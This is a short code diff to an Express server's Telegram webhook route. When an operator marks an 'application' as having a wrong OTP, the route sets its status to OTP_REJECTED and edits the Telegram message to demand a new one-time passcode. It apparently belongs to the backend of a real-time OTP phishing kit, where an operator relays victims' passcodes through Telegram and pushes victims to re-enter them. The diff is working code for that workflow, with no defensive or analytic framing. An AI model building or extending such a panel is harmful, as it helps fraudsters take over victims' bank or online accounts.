@@ -426,10 +426,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const appReference = actionData.replace('otp_wrong_', '');
     if (activeApplications.has(appReference)) {
       const appData = activeApplications.get(appReference);
-      appData.status = 'OTP_REJECTED';
+      appData.status = 'OTP_REJECTED'; // <--- Restored to OTP_REJECTED so it responds specifically to OTP re-entry
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: WRONG OTP ❌</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: WRONG OTP ❌ (RETRIEVE NEW OTP)</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 });
